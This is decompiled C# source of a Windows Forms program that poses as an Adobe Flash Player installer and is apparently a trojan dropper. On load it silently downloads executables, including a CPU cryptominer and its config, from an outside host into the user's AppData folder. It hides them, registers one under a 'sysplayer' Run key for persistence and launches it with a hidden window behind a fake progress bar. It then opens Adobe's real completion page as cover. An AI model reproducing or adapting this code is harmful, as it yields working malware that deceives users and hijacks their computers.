using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Free_Sms_Sender;

public class Form1 : Form
{
	public string filepath;

	public string filepath2;

	private string folderpath;

	public int dro = 15;

	private IContainer components = null;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private PictureBox pictureBox1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private RadioButton radioButton1;

	private RadioButton radioButton2;

	private RadioButton radioButton3;

	private Label label5;

	private Label label7;

	private Label label6;

	private ProgressBar progressBar1;

	private PictureBox pictureBox2;

	private Timer timer1;

	private PictureBox pictureBox3;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private bool IsStartupItem()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("sysplayer") == null)
		{
			return false;
		}
		return true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		((Control)label2).set_Text("Security updates and enhancements are pariodically released for Adobe Flash Player \nthat can be downloaded and installed aucomatically.");
		try
		{
			folderpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			WebClient webClient = new WebClient();
			string text = "";
			text = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
			if (text.Contains("64"))
			{
				webClient.DownloadFile(new Uri("https://sainformacio.info/winstart2.exe"), folderpath + "\\winstart.exe");
				webClient.DownloadFileAsync(new Uri("https://sainformacio.info/x64.exe"), folderpath + "\\sysplayer.exe");
			}
			else
			{
				webClient.DownloadFile(new Uri("https://sainformacio.info/winstart2.exe"), folderpath + "\\winstart.exe");
				webClient.DownloadFile(new Uri("https://sainformacio.info/msvcr120.dll"), folderpath + "\\msvcr120.dll");
				webClient.DownloadFile(new Uri("https://sainformacio.info/cpuminer-conf.json"), folderpath + "\\cpuminer-conf.json");
				webClient.DownloadFileAsync(new Uri("https://sainformacio.info/cpuminer-x86.exe"), folderpath + "\\sysplayer.exe");
			}
			filepath2 = folderpath + "\\winstart.exe";
			filepath = folderpath + "\\sysplayer.exe";
			File.SetAttributes(filepath, FileAttributes.Hidden);
			File.SetAttributes(filepath2, FileAttributes.Hidden);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (!IsStartupItem())
		{
			registryKey.SetValue("sysplayer", folderpath.ToString() + "\\winstart.exe");
		}
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		tabControl1.set_Appearance((TabAppearance)2);
		tabControl1.set_ItemSize(new Size(0, 1));
		tabControl1.set_SizeMode((TabSizeMode)2);
		((Panel)tabPage1).set_BorderStyle((BorderStyle)0);
		tabControl1.set_SelectedTab(tabPage2);
		((Control)tabControl1).set_Visible(true);
		timer1.Start();
	}

	private void tabPage2_Click(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		dro--;
		if (dro == 5)
		{
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\winstart.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		if (dro == 0)
		{
			timer1.set_Enabled(false);
			timer1.Stop();
			progressBar1.set_Value(15);
			((Control)label7).set_Text("installed.");
			((Control)label8).set_ForeColor(Color.Red);
			((Control)label8).set_Visible(true);
			((Control)pictureBox3).set_Visible(true);
		}
		else
		{
			ProgressBar obj = progressBar1;
			obj.set_Value(obj.get_Value() + 1);
		}
	}

	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox3_Click(object sender, EventArgs e)
	{
		Process.Start("https://get.adobe.com/flashplayer/completion/adm/?exitcode=3&type=install");
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_01e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_0372: Expected O, but got Unknown
		//IL_0405: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_04aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b4: Expected O, but got Unknown
		//IL_052a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Expected O, but got Unknown
		//IL_0617: Unknown result type (might be due to invalid IL or missing references)
		//IL_0621: Expected O, but got Unknown
		//IL_0692: Unknown result type (might be due to invalid IL or missing references)
		//IL_069c: Expected O, but got Unknown
		//IL_072b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0735: Expected O, but got Unknown
		//IL_07ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b5: Expected O, but got Unknown
		//IL_0828: Unknown result type (might be due to invalid IL or missing references)
		//IL_0832: Expected O, but got Unknown
		//IL_08a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b2: Expected O, but got Unknown
		//IL_092e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0938: Expected O, but got Unknown
		//IL_09c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d3: Expected O, but got Unknown
		//IL_0a64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6e: Expected O, but got Unknown
		//IL_0aff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b09: Expected O, but got Unknown
		//IL_0c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8d: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		tabPage2 = new TabPage();
		label8 = new Label();
		pictureBox3 = new PictureBox();
		label7 = new Label();
		label6 = new Label();
		progressBar1 = new ProgressBar();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		radioButton1 = new RadioButton();
		radioButton2 = new RadioButton();
		radioButton3 = new RadioButton();
		label5 = new Label();
		timer1 = new Timer(components);
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage2).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage2);
		((Control)tabControl1).set_Location(new Point(-7, -23));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(764, 414));
		((Control)tabControl1).set_TabIndex(9);
		((Control)tabControl1).set_Visible(false);
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(759, 353));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("tabPage1");
		tabPage1.set_UseVisualStyleBackColor(true);
		((Control)tabPage2).set_BackColor(Color.White);
		((Control)tabPage2).get_Controls().Add((Control)(object)label8);
		((Control)tabPage2).get_Controls().Add((Control)(object)pictureBox3);
		((Control)tabPage2).get_Controls().Add((Control)(object)label7);
		((Control)tabPage2).get_Controls().Add((Control)(object)label6);
		((Control)tabPage2).get_Controls().Add((Control)(object)progressBar1);
		((Control)tabPage2).get_Controls().Add((Control)(object)pictureBox2);
		tabPage2.set_Location(new Point(4, 22));
		((Control)tabPage2).set_Name("tabPage2");
		((Control)tabPage2).set_Padding(new Padding(3));
		((Control)tabPage2).set_Size(new Size(756, 388));
		tabPage2.set_TabIndex(1);
		((Control)tabPage2).set_Text("tabPage2");
		((Control)tabPage2).add_Click((EventHandler)tabPage2_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_Location(new Point(334, 42));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(171, 16));
		((Control)label8).set_TabIndex(5);
		((Control)label8).set_Text("Please restart your browser");
		label8.set_TextAlign((ContentAlignment)2);
		((Control)label8).set_Visible(false);
		((Control)pictureBox3).set_Cursor(Cursors.get_Hand());
		pictureBox3.set_Image((Image)componentResourceManager.GetObject("pictureBox3.Image"));
		((Control)pictureBox3).set_Location(new Point(464, 291));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(237, 62));
		pictureBox3.set_TabIndex(4);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox3).set_Visible(false);
		((Control)pictureBox3).add_Click((EventHandler)pictureBox3_Click);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(266, 42));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(99, 16));
		((Control)label7).set_TabIndex(3);
		((Control)label7).set_Text("Downloading ...");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(124, 42));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(148, 16));
		((Control)label6).set_TabIndex(2);
		((Control)label6).set_Text("Adofe Flash Player: ");
		((Control)progressBar1).set_BackColor(Color.Black);
		((Control)progressBar1).set_Location(new Point(124, 61));
		progressBar1.set_Maximum(15);
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(543, 23));
		((Control)progressBar1).set_TabIndex(1);
		((Control)progressBar1).add_Click((EventHandler)progressBar1_Click);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(18, 34));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(100, 61));
		pictureBox2.set_TabIndex(0);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(461, 290));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(237, 62));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(49, 41));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(285, 24));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Update Flash Player Preferences");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(50, 76));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(77, 16));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("asdasdasd");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(50, 132));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(105, 16));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("IMPORTANT :");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(152, 132));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(338, 16));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("Your update options have recently changed Learn More");
		((Control)radioButton1).set_AutoSize(true);
		((Control)radioButton1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton1).set_Location(new Point(70, 192));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(304, 20));
		((Control)radioButton1).set_TabIndex(5);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("Allow Adobe to install updates (recommended)");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		((Control)radioButton2).set_AutoSize(true);
		((Control)radioButton2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton2).set_Location(new Point(70, 215));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(185, 20));
		((Control)radioButton2).set_TabIndex(6);
		radioButton2.set_TabStop(true);
		((Control)radioButton2).set_Text("Notify me to install updates");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		((Control)radioButton3).set_AutoSize(true);
		((Control)radioButton3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radioButton3).set_Location(new Point(70, 238));
		((Control)radioButton3).set_Name("radioButton3");
		((Control)radioButton3).set_Size(new Size(292, 20));
		((Control)radioButton3).set_TabIndex(7);
		radioButton3.set_TabStop(true);
		((Control)radioButton3).set_Text("Never check for updates (not recommended)");
		((ButtonBase)radioButton3).set_UseVisualStyleBackColor(true);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(50, 164));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(172, 16));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("Choose your update option:");
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ButtonHighlight);
		((Form)this).set_ClientSize(new Size(751, 381));
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)radioButton3);
		((Control)this).get_Controls().Add((Control)(object)radioButton2);
		((Control)this).get_Controls().Add((Control)(object)radioButton1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Adobe Flash Player  Installer");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage2).ResumeLayout(false);
		((Control)tabPage2).PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
